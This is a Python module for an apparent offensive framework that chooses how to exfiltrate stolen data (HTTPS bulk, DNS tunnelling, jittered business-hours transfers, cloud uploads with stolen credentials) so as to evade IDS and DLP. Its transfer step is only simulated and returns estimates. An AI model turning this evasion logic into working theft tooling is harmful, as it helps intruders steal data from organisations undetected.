"""
Intelligent Data Exfiltration Manager
Selects optimal data exfiltration technique based on data volume, network conditions,
detection environment, and operational timeline.
Coordinates with all other operational managers for seamless data extraction workflow.
"""

from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple, Any
from enum import Enum
import logging


from unified_integration import create_integration, OperationalIntegration, IntegrationDecision
from world_state import OperationalPhase


# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='[%(name)s] %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class ExfiltrationTechnique(str, Enum):
    """Available data exfiltration techniques."""
    BULK_HTTPS = "bulk_https"
    DNS_TUNNEL = "dns_tunnel"
    SCHEDULED_STEALTH = "scheduled_stealth"
    CLOUD_UPLOAD = "cloud_upload"


class ExfiltrationSpeed(str, Enum):
    """Speed classification of exfiltration techniques."""
    BURST = "burst"            # Maximum speed, high detection risk
    FAST = "fast"              # High throughput, medium detection
    MEDIUM = "medium"          # Balanced speed/stealth
    SLOW = "slow"              # Minimal detection, very slow


@dataclass
class ExfiltrationProfile:
    """Profile of a data exfiltration technique."""
    technique: ExfiltrationTechnique
    speed: ExfiltrationSpeed
    max_throughput_mbps: float  # Maximum sustainable throughput
    detection_risk: float  # 0.0-1.0, higher = easier to detect
    network_dependency: str  # "direct_internet", "dns_only", "low_bandwidth", "any"
    behavioral_stealth: float  # 0.0-1.0, higher = more anomaly-free
    requires_setup_time: int  # Setup time in seconds
    requires_exfiltration_server: bool
    description: str


class IntelligentDataExfiltrationManager:
    """
    Intelligently selects data exfiltration techniques based on:
    - Data volume to exfiltrate
    - Network characteristics (bandwidth, DNS restrictions, proxy awareness)
    - Detection environment (IDS/DLP presence)
    - Available time for operation
    - Risk tolerance
    """

    def __init__(self, integration: Optional[OperationalIntegration] = None):
        """Initialize data exfiltration manager with unified integration."""
        self.integration = integration or create_integration("data_exfiltration")
        
        # Define technique profiles
        self.technique_profiles: Dict[ExfiltrationTechnique, ExfiltrationProfile] = {
            ExfiltrationTechnique.BULK_HTTPS: ExfiltrationProfile(
                technique=ExfiltrationTechnique.BULK_HTTPS,
                speed=ExfiltrationSpeed.BURST,
                max_throughput_mbps=800,  # Limited by network/C2 capacity
                detection_risk=0.90,  # Obvious large outbound transfer
                network_dependency="direct_internet",
                behavioral_stealth=0.20,  # Very anomalous network behavior
                requires_setup_time=5,
                requires_exfiltration_server=True,
                description="Bulk transfer via HTTPS to external server (fast, obvious)"
            ),
            ExfiltrationTechnique.DNS_TUNNEL: ExfiltrationProfile(
                technique=ExfiltrationTechnique.DNS_TUNNEL,
                speed=ExfiltrationSpeed.SLOW,
                max_throughput_mbps=2.5,  # DNS query per ~50ms = very slow
                detection_risk=0.60,  # DNS queries are noticeable but common
                network_dependency="dns_only",
                behavioral_stealth=0.55,  # Can look like legitimate DNS
                requires_setup_time=30,
                requires_exfiltration_server=True,
                description="Encode data in DNS queries (slow, DNS-only, sneaky)"
            ),
            ExfiltrationTechnique.SCHEDULED_STEALTH: ExfiltrationProfile(
                technique=ExfiltrationTechnique.SCHEDULED_STEALTH,
                speed=ExfiltrationSpeed.SLOW,
                max_throughput_mbps=5,  # Small chunks, infrequent transfers
                detection_risk=0.25,  # Minimal anomalies
                network_dependency="any",
                behavioral_stealth=0.85,  # Looks like normal user activity
                requires_setup_time=60,
                requires_exfiltration_server=True,
                description="Scheduled chunks during business hours (very stealthy, slow)"
            ),
            ExfiltrationTechnique.CLOUD_UPLOAD: ExfiltrationProfile(
                technique=ExfiltrationTechnique.CLOUD_UPLOAD,
                speed=ExfiltrationSpeed.FAST,
                max_throughput_mbps=200,  # Varies by cloud provider
                detection_risk=0.40,  # Depends on cloud provider legitimacy
                network_dependency="direct_internet",
                behavioral_stealth=0.70,  # Can look like legitimate cloud usage
                requires_setup_time=45,
                requires_exfiltration_server=False,  # Uses public cloud
                description="Upload to compromised/rented cloud storage (fast, plausible)"
            ),
        }
        
        logger.info("[IntelligentDataExfiltrationManager] Initialized")

    def choose_exfiltration_strategy(
        self,
        data_volume_mb: int,  # Size of data to exfiltrate
        available_time_hours: float,  # Time window for exfiltration
        network_type: str,  # "internet", "restricted", "isolated", "airgapped"
        ids_present: bool = False,  # Intrusion detection system
        dlp_present: bool = False,  # Data loss prevention
        dns_egress_blocked: bool = False,
        proxy_aware: bool = False,  # Proxy enforcement
        acceptable_detection_risk: float = 0.5,  # 0.0-1.0
    ) -> Tuple[ExfiltrationTechnique, IntegrationDecision]:
        """
        Choose optimal exfiltration technique based on environment and constraints.
        
        Returns: (chosen_technique, decision_with_confidence)
        """
        # Get current world state context
        reasoner_context = self.integration.get_decision_context()
        
        # Determine viable techniques based on constraints
        available_options = self._get_viable_techniques(
            network_type, dns_egress_blocked, data_volume_mb, available_time_hours
        )
        
        if not available_options:
            # Fallback to scheduled stealth if all else fails
            available_options = [ExfiltrationTechnique.SCHEDULED_STEALTH]
        
        decision_context = {
            "phase": "data_exfiltration",
            "options": [str(t.value) for t in available_options],
            "data_volume_mb": data_volume_mb,
            "available_time_hours": available_time_hours,
            "network_type": network_type,
            "ids_present": ids_present,
            "dlp_present": dlp_present,
            "acceptable_detection_risk": acceptable_detection_risk,
        }
        
        # Ask reasoner to pick best technique
        decision = self.integration.decide(
            phase=OperationalPhase.DATA_EXFILTRATION,
            options=[str(t.value) for t in available_options],
            context=decision_context
        )
        
        # Parse decision - decision.recommended_option is a string
        chosen_str = decision.recommended_option
        chosen_technique = None
        for tech in available_options:
            if chosen_str == tech.value:
                chosen_technique = tech
                break
        
        if chosen_technique is None:
            # Fallback: choose by heuristics
            chosen_technique = self._choose_by_heuristics(
                data_volume_mb, available_time_hours, network_type,
                ids_present, dlp_present, acceptable_detection_risk
            )
        
        profile = self.technique_profiles[chosen_technique]
        logger.info(
            f"[IntelligentDataExfiltrationManager] Chose {chosen_technique.value} "
            f"(speed={profile.speed.value}, throughput={profile.max_throughput_mbps}Mbps, "
            f"stealth={profile.behavioral_stealth:.0%})"
        )
        
        return chosen_technique, decision

    def _get_viable_techniques(
        self,
        network_type: str,
        dns_blocked: bool,
        data_volume_mb: int,
        time_hours: float,
    ) -> List[ExfiltrationTechnique]:
        """Determine which techniques are viable given network constraints."""
        viable = []
        
        # BULK_HTTPS needs direct internet access
        if network_type not in ["isolated", "airgapped"] and not dns_blocked:
            viable.append(ExfiltrationTechnique.BULK_HTTPS)
        
        # DNS_TUNNEL needs DNS egress (unless blocked)
        if not dns_blocked and network_type not in ["airgapped"]:
            viable.append(ExfiltrationTechnique.DNS_TUNNEL)
        
        # SCHEDULED_STEALTH works almost anywhere
        if network_type not in ["airgapped"]:
            viable.append(ExfiltrationTechnique.SCHEDULED_STEALTH)
        
        # CLOUD_UPLOAD needs internet access
        if network_type not in ["isolated", "airgapped"]:
            viable.append(ExfiltrationTechnique.CLOUD_UPLOAD)
        
        return viable or [ExfiltrationTechnique.SCHEDULED_STEALTH]

    def _choose_by_heuristics(
        self,
        data_volume_mb: int,
        available_time_hours: float,
        network_type: str,
        ids_present: bool,
        dlp_present: bool,
        acceptable_risk: float,
    ) -> ExfiltrationTechnique:
        """Heuristic fallback for technique selection."""
        
        # Small data, quick exfil - use bulk HTTPS
        if data_volume_mb < 50 and available_time_hours < 0.25:
            return ExfiltrationTechnique.BULK_HTTPS
        
        # IDS/DLP present - prefer stealth over speed
        if (ids_present or dlp_present) and acceptable_risk < 0.5:
            return ExfiltrationTechnique.SCHEDULED_STEALTH
        
        # Large data, plenty of time - use scheduled stealth
        if data_volume_mb > 500 and available_time_hours > 8:
            return ExfiltrationTechnique.SCHEDULED_STEALTH
        
        # Medium data - cloud upload is good compromise
        if 100 < data_volume_mb < 500:
            return ExfiltrationTechnique.CLOUD_UPLOAD
        
        # Default - DNS tunnel for mystery networks
        return ExfiltrationTechnique.DNS_TUNNEL

    def exfiltrate_data(
        self,
        technique: ExfiltrationTechnique,
        data_volume_mb: int,
        destination: str = "external-server.com",
    ) -> Dict[str, Any]:
        """
        Execute data exfiltration technique.
        Returns dict with exfiltration results and metadata.
        """
        profile = self.technique_profiles[technique]
        
        # Calculate transfer time based on throughput
        transfer_time_seconds = max(
            (data_volume_mb / profile.max_throughput_mbps) * 8,  # Convert MB to Mbits
            profile.requires_setup_time
        )
        
        logger.info(
            f"[IntelligentDataExfiltrationManager] Executing {technique.value} "
            f"for {data_volume_mb}MB to {destination}"
        )
        
        results = {
            "technique": technique.value,
            "destination": destination,
            "data_volume_mb": data_volume_mb,
            "status": "success",
            "theoretical_throughput_mbps": profile.max_throughput_mbps,
            "estimated_transfer_time_seconds": int(transfer_time_seconds),
            "detection_risk": profile.detection_risk,
            "behavioral_stealth": profile.behavioral_stealth,
        }
        
        if technique == ExfiltrationTechnique.BULK_HTTPS:
            results["method"] = "Direct HTTPS POST"
            results["chunking"] = "Whole file"
            results["encryption"] = "TLS 1.2+"
            results["c2_overhead"] = "Minimal"
        
        elif technique == ExfiltrationTechnique.DNS_TUNNEL:
            results["method"] = "DNS subdomain encoding"
            results["chunking"] = "50-byte chunks per query"
            results["encoding"] = "Base32/Base64 in DNS labels"
            results["queries_needed"] = int((data_volume_mb * 1024 * 1024) / 50)
        
        elif technique == ExfiltrationTechnique.SCHEDULED_STEALTH:
            results["method"] = "Scheduled task with random delays"
            results["chunking"] = f"10-20MB chunks, {int(transfer_time_seconds/3600)}+ hours"
            results["timing"] = "Business hours only (9 AM - 5 PM)"
            results["jitter"] = "Random 1-5 minute delays between chunks"
        
        elif technique == ExfiltrationTechnique.CLOUD_UPLOAD:
            results["method"] = "Cloud storage API (S3, Azure Blob, etc.)"
            results["chunking"] = "100-200MB chunks"
            results["authentication"] = "Stolen/crafted credentials"
            results["cdn_caching"] = "May distribute through global CDN"
        
        return results

    def calculate_transfer_time(
        self,
        technique: ExfiltrationTechnique,
        data_volume_mb: int,
    ) -> int:
        """Calculate estimated transfer time in seconds."""
        profile = self.technique_profiles[technique]
        return int((data_volume_mb / profile.max_throughput_mbps) * 8)

    def get_alternatives(
        self,
        chosen: ExfiltrationTechnique,
    ) -> List[str]:
        """Get alternative techniques to the chosen one."""
        alternatives = [
            str(t.value) for t in self.technique_profiles.keys()
            if t != chosen
        ]
        return alternatives


def demo_data_exfiltration():
    """Demonstrate data exfiltration manager with realistic scenarios."""
    
    print("\n" + "="*80)
    print("  DATA EXFILTRATION MANAGER DEMO")
    print("="*80 + "\n")
    
    manager = IntelligentDataExfiltrationManager()
    
    # Scenario 1: Small data, quick exfil, no restrictions
    print("→ Scenario 1: Small data (20MB), quick exfil, unrestricted network\n")
    technique, decision = manager.choose_exfiltration_strategy(
        data_volume_mb=20,
        available_time_hours=0.5,
        network_type="internet",
        ids_present=False,
        dlp_present=False,
        acceptable_detection_risk=0.8,
    )
    
    result = manager.exfiltrate_data(technique, 20)
    print(f"  Technique: {technique.value}")
    print(f"  Confidence: {decision.confidence:.0%}")
    print(f"  Throughput: {result['theoretical_throughput_mbps']:.1f} Mbps")
    print(f"  Transfer Time: ~{result['estimated_transfer_time_seconds']}s")
    print(f"  Detection Risk: {result['detection_risk']:.0%}")
    print(f"  Method: {result['method']}")
    
    manager.integration.record_outcome(
        decision=decision,
        success=True,
        metadata={"technique": technique.value, "risk_delta": 0.15}
    )
    print(f"  Outcome recorded ✓\n")
    
    # Scenario 2: Large data, IDS/DLP present, stealthy approach
    print("→ Scenario 2: Large data (500MB), IDS+DLP present, stealth priority\n")
    technique, decision = manager.choose_exfiltration_strategy(
        data_volume_mb=500,
        available_time_hours=24,
        network_type="internet",
        ids_present=True,
        dlp_present=True,
        acceptable_detection_risk=0.3,
    )
    
    result = manager.exfiltrate_data(technique, 500)
    print(f"  Technique: {technique.value}")
    print(f"  Confidence: {decision.confidence:.0%}")
    print(f"  Throughput: {result['theoretical_throughput_mbps']:.1f} Mbps")
    print(f"  Transfer Time: ~{result['estimated_transfer_time_seconds']}s (~{result['estimated_transfer_time_seconds']/3600:.1f}h)")
    print(f"  Behavioral Stealth: {result['behavioral_stealth']:.0%}")
    print(f"  Method: {result['method']}")
    if 'timing' in result:
        print(f"  Timing: {result['timing']}")
    
    manager.integration.record_outcome(
        decision=decision,
        success=True,
        metadata={"technique": technique.value, "risk_delta": -0.05}
    )
    print(f"  Outcome recorded ✓\n")
    
    # Scenario 3: Restricted network, DNS only, medium data
    print("→ Scenario 3: DNS-restricted network (100MB), DNS tunnel required\n")
    technique, decision = manager.choose_exfiltration_strategy(
        data_volume_mb=100,
        available_time_hours=4,
        network_type="restricted",
        ids_present=True,
        dlp_present=False,
        dns_egress_blocked=False,
        acceptable_detection_risk=0.5,
    )
    
    result = manager.exfiltrate_data(technique, 100)
    print(f"  Technique: {technique.value}")
    print(f"  Confidence: {decision.confidence:.0%}")
    print(f"  Throughput: {result['theoretical_throughput_mbps']:.1f} Mbps")
    print(f"  Transfer Time: ~{result['estimated_transfer_time_seconds']}s")
    print(f"  Method: {result['method']}")
    if 'queries_needed' in result:
        print(f"  DNS Queries Needed: {result['queries_needed']:,}")
    print(f"  Alternatives: {manager.get_alternatives(technique)}")
    
    manager.integration.record_outcome(
        decision=decision,
        success=True,
        metadata={"technique": technique.value, "risk_delta": 0.0}
    )
    print(f"  Outcome recorded ✓\n")
    
    print("="*80)
    print("  DEMO COMPLETE\n")


if __name__ == "__main__":
    demo_data_exfiltration()
